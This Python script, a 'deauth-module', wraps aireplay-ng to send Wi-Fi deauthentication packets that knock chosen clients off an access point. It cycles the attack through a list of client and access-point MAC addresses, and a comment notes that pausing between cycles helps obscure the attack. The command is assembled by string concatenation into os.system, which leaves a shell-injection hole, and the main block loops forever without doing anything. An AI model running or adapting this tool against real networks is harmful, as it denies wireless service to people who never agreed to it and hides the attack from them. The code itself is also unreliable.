import os
from datetime import datetime
import time
def de_auth_client( client_mac,
                    access_point_mac,
                    num_packets = 1,
                    adapter="wlan0mon"):

    # fast but no stdout/err
    r = os.system("aireplay-ng " + "-0 " + str(num_packets) + " -a " + str(access_point_mac) \
              + " -c " + client_mac + " " + adapter)

    """
    # slow but better feedback
    import subprocess
    r2 = subprocess.call(["aireplay-ng", "-0", str(num_packets), "-a", str(access_point_mac),\
                          "-c", client_mac, adapter], stdout=subprocess.PIPE)

    stdout, stderr = r2.communicate()
    """
    return r

def attack_clients(clients_dict,
                   packets_per_client,
                   adapter,
                   timeout=60,
                   list_cycles=100,
                   time_between_cycles = 1
                   ):
    """ At this point it we know exactly who are we attacking
        - packets_per_client (int) doesn't necessarily have to large if
        cycling a list of clients is fast enough
        - time_between_cycles (int seconds) can help obscure the attack
        - timeout, list_cycles (int) determine for how long should the attack run
    """
    CURR_TIME = datetime.now()
    TIME_DIFF = datetime.now() - CURR_TIME

    count = 0
    for client in clients_dict:
        if list_cycles <= count or timeout < TIME_DIFF.total_seconds() :
            return 1
        count += 1
        de_auth_client(client["client_mac"],
                       client["ap_mac"],
                       num_packets=packets_per_client,
                       adapter=adapter)
        TIME_DIFF = datetime.now() - CURR_TIME
    return 0


if __name__ == "__main__":
    print ("deauth-module")

    CYCLES = 100
    count = 0
    while count < CYCLES:
        count = 0





